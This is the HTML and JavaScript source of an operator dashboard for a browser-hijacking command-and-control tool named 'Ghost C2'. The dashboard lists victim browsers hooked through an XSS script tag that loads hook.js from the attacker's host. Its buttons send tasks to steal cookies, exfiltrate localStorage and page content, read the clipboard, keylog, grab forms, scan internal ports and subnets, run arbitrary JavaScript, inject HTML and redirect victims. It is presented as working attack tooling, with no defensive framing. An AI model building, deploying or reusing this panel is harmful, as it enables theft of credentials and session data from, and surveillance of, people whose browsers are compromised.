<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ghost C2 — Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0a; color: #e0e0e0; font-family: 'Courier New', monospace; font-size: 14px; }

    .header { background: #111; border-bottom: 1px solid #c0392b; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
    .header h1 { color: #c0392b; font-size: 18px; }
    .header .status { color: #2ecc71; font-size: 12px; }

    .container { display: grid; grid-template-columns: 300px 1fr; grid-template-rows: 1fr 300px; height: calc(100vh - 48px); }

    /* Agent list */
    .agents-panel { background: #111; border-right: 1px solid #222; overflow-y: auto; }
    .agents-panel h2 { padding: 10px; font-size: 13px; color: #c0392b; border-bottom: 1px solid #222; }
    .agent-card { padding: 10px; border-bottom: 1px solid #1a1a1a; cursor: pointer; transition: background 0.15s; }
    .agent-card:hover { background: #1a1a1a; }
    .agent-card.selected { background: #1c1c1c; border-left: 3px solid #c0392b; }
    .agent-card .aid { color: #c0392b; font-weight: bold; }
    .agent-card .url { color: #888; font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .agent-card .meta { color: #555; font-size: 11px; margin-top: 3px; }

    /* Main area */
    .main-panel { padding: 15px; overflow-y: auto; }
    .main-panel h2 { color: #c0392b; margin-bottom: 10px; font-size: 14px; }

    /* Agent detail */
    .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
    .detail-item { background: #111; padding: 8px 10px; border-radius: 4px; }
    .detail-item .label { color: #666; font-size: 11px; }
    .detail-item .value { color: #ddd; font-size: 12px; margin-top: 2px; word-break: break-all; }

    /* Task buttons */
    .task-bar { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 15px; }
    .task-btn { background: #1a1a1a; border: 1px solid #333; color: #ccc; padding: 6px 12px; font-family: monospace; font-size: 12px; cursor: pointer; border-radius: 3px; transition: all 0.15s; }
    .task-btn:hover { background: #c0392b; color: #fff; border-color: #c0392b; }

    /* Results */
    .results-panel { grid-column: 1 / -1; background: #0d0d0d; border-top: 1px solid #222; overflow-y: auto; padding: 10px; }
    .results-panel h2 { color: #c0392b; font-size: 13px; margin-bottom: 8px; }
    .result-entry { background: #111; margin-bottom: 5px; padding: 8px; border-radius: 3px; font-size: 12px; }
    .result-entry .ts { color: #555; }
    .result-entry .type { color: #e67e22; font-weight: bold; }
    .result-entry pre { color: #2ecc71; margin-top: 4px; white-space: pre-wrap; word-break: break-all; max-height: 150px; overflow-y: auto; }

    /* Custom JS input */
    .custom-input { display: flex; gap: 6px; margin-bottom: 15px; }
    .custom-input input { flex: 1; background: #111; border: 1px solid #333; color: #e0e0e0; padding: 6px 10px; font-family: monospace; font-size: 12px; border-radius: 3px; }
    .custom-input input:focus { outline: none; border-color: #c0392b; }

    .empty-state { color: #444; text-align: center; margin-top: 40px; }
  </style>
</head>
<body>
  <div class="header">
    <h1>GHOST C2</h1>
    <span class="status" id="conn-status">ONLINE — polling...</span>
  </div>

  <div class="container">
    <div class="agents-panel">
      <h2>AGENTS (<span id="agent-count">0</span>)</h2>
      <div id="agent-list"></div>
    </div>

    <div class="main-panel" id="main">
      <div class="empty-state">
        <p>No agent selected.</p>
        <p style="margin-top:8px; color:#555;">Inject hook via XSS:</p>
        <p style="margin-top:4px; color:#c0392b;">&lt;script src="http://HOST:5000/hook.js"&gt;&lt;/script&gt;</p>
      </div>
    </div>

    <div class="results-panel">
      <h2>RESULTS FEED</h2>
      <div id="results-feed"></div>
    </div>
  </div>

  <script>
    let selectedAgent = null;
    let agents = [];
    let knownResults = 0;

    // ─── HTML escape ──────────────────────────────
    function esc(str) {
      const div = document.createElement("div");
      div.textContent = String(str ?? "");
      return div.innerHTML;
    }

    // ─── Polling ──────────────────────────────────
    async function refreshAgents() {
      try {
        const res = await fetch("/panel/agents");
        agents = await res.json();
        renderAgentList();
        if (selectedAgent) renderAgentDetail(selectedAgent);
      } catch (e) {
        document.getElementById("conn-status").textContent = "OFFLINE";
        document.getElementById("conn-status").style.color = "#c0392b";
      }
    }

    async function refreshResults() {
      try {
        const res = await fetch("/panel/results");
        const data = await res.json();
        if (data.length !== knownResults) {
          knownResults = data.length;
          renderResults(data);
        }
      } catch (e) {}
    }

    // ─── Render ───────────────────────────────────
    function renderAgentList() {
      const el = document.getElementById("agent-list");
      document.getElementById("agent-count").textContent = agents.length;

      el.innerHTML = agents.map(a => `
        <div class="agent-card ${selectedAgent === a.id ? 'selected' : ''}" onclick="selectAgent('${esc(a.id)}')">
          <div class="aid">${esc(a.id)}</div>
          <div class="url">${esc(a.url || 'unknown')}</div>
          <div class="meta">${esc(a.platform)} | tasks: ${a.pending_tasks} | results: ${a.results_count}</div>
          <div class="meta">last: ${timeAgo(a.last_seen)}</div>
        </div>
      `).join("");
    }

    async function selectAgent(id) {
      selectedAgent = id;
      renderAgentList();
      await renderAgentDetail(id);
    }

    async function renderAgentDetail(id) {
      const main = document.getElementById("main");
      try {
        const res = await fetch(`/panel/agent/${id}`);
        const agent = await res.json();
        const info = agent.info || {};

        main.innerHTML = `
          <h2>AGENT: ${esc(id)}</h2>
          <div class="detail-grid">
            <div class="detail-item"><div class="label">URL</div><div class="value">${esc(info.url || '?')}</div></div>
            <div class="detail-item"><div class="label">Platform</div><div class="value">${esc(info.platform || '?')}</div></div>
            <div class="detail-item"><div class="label">User-Agent</div><div class="value">${esc((info.user_agent || '?').slice(0,80))}</div></div>
            <div class="detail-item"><div class="label">Screen</div><div class="value">${esc(info.screen || '?')}</div></div>
            <div class="detail-item"><div class="label">Language</div><div class="value">${esc(info.language || '?')}</div></div>
            <div class="detail-item"><div class="label">Cookies</div><div class="value">${esc(info.cookies || '(none)')}</div></div>
            <div class="detail-item"><div class="label">Registered</div><div class="value">${esc(agent.registered)}</div></div>
            <div class="detail-item"><div class="label">LocalStorage Keys</div><div class="value">${esc((info.local_storage_keys || []).join(', ') || '(none)')}</div></div>
          </div>

          <h2>COMMANDS</h2>
          <div class="task-bar">
            <button class="task-btn" onclick="sendTask('${id}','steal_cookies')">Steal Cookies</button>
            <button class="task-btn" onclick="sendTask('${id}','exfil_localstorage')">Exfil Storage</button>
            <button class="task-btn" onclick="sendTask('${id}','exfil_page')">Exfil Page</button>
            <button class="task-btn" onclick="sendTask('${id}','screenshot')">DOM Snapshot</button>
            <button class="task-btn" onclick="sendTask('${id}','clipboard')">Clipboard</button>
            <button class="task-btn" onclick="sendKeylog('${id}')">Keylog 15s</button>
            <button class="task-btn" onclick="sendFormGrab('${id}')">Form Grab 30s</button>
            <button class="task-btn" onclick="sendPortscan('${id}')">Port Scan</button>
            <button class="task-btn" onclick="sendNetDiscover('${id}')">Net Discover</button>
          </div>

          <h2>EXECUTE JS</h2>
          <div class="custom-input">
            <input type="text" id="js-input" placeholder="document.cookie" onkeydown="if(event.key==='Enter')sendCustomJS('${id}')">
            <button class="task-btn" onclick="sendCustomJS('${id}')">Run</button>
          </div>

          <h2>INJECT HTML</h2>
          <div class="custom-input">
            <input type="text" id="html-input" placeholder='<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:10px;z-index:99999">PWNED</div>'>
            <button class="task-btn" onclick="sendInjectHTML('${id}')">Inject</button>
          </div>

          <h2>REDIRECT</h2>
          <div class="custom-input">
            <input type="text" id="redirect-input" placeholder="http://localhost:3000" onkeydown="if(event.key==='Enter')sendRedirect('${id}')">
            <button class="task-btn" onclick="sendRedirect('${id}')">Redirect</button>
          </div>
        `;
      } catch (e) {
        main.innerHTML = `<div class="empty-state">Error loading agent ${id}</div>`;
      }
    }

    function renderResults(data) {
      const el = document.getElementById("results-feed");
      el.innerHTML = data.slice().reverse().map(r => `
        <div class="result-entry">
          <span class="ts">${esc(r.ts)}</span> |
          <span class="type">${esc(r.task_type)}</span> |
          agent: ${esc(r.agent_id)}
          <pre>${esc(JSON.stringify(r.data, null, 2).slice(0, 2000))}</pre>
        </div>
      `).join("");
    }

    // ─── Task senders ─────────────────────────────
    async function sendTask(agentId, type, payload = {}) {
      await fetch("/panel/task", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent_id: agentId, type, payload }),
      });
    }

    function sendKeylog(id) {
      sendTask(id, "keylog", { duration: 15000 });
    }

    function sendFormGrab(id) {
      sendTask(id, "form_grab", { duration: 30000 });
    }

    function sendPortscan(id) {
      const target = prompt("Target IP:", "localhost");
      const ports = prompt("Ports (comma-sep):", "80,443,3000,5000,8080,3306,5432,22,3333,9090");
      if (target && ports) {
        sendTask(id, "portscan", {
          target,
          ports: ports.split(",").map(p => parseInt(p.trim())),
        });
      }
    }

    function sendNetDiscover(id) {
      const base = prompt("Subnet base:", "172.23.0");
      const start = parseInt(prompt("Start:", "1"));
      const end = parseInt(prompt("End:", "10"));
      if (base) {
        sendTask(id, "network_discovery", { base, start, end });
      }
    }

    function sendCustomJS(id) {
      const code = document.getElementById("js-input").value;
      if (code) sendTask(id, "exec_js", { code });
    }

    function sendInjectHTML(id) {
      const html = document.getElementById("html-input").value;
      if (html) sendTask(id, "inject_html", { html });
    }

    function sendRedirect(id) {
      const url = document.getElementById("redirect-input").value;
      if (url) sendTask(id, "redirect", { url });
    }

    // ─── Util ─────────────────────────────────────
    function timeAgo(iso) {
      const diff = Date.now() - new Date(iso).getTime();
      const s = Math.floor(diff / 1000);
      if (s < 5) return "now";
      if (s < 60) return s + "s ago";
      if (s < 3600) return Math.floor(s / 60) + "m ago";
      return Math.floor(s / 3600) + "h ago";
    }

    // ─── Main loop ────────────────────────────────
    setInterval(refreshAgents, 2000);
    setInterval(refreshResults, 2000);
    refreshAgents();
    refreshResults();
  </script>
</body>
</html>
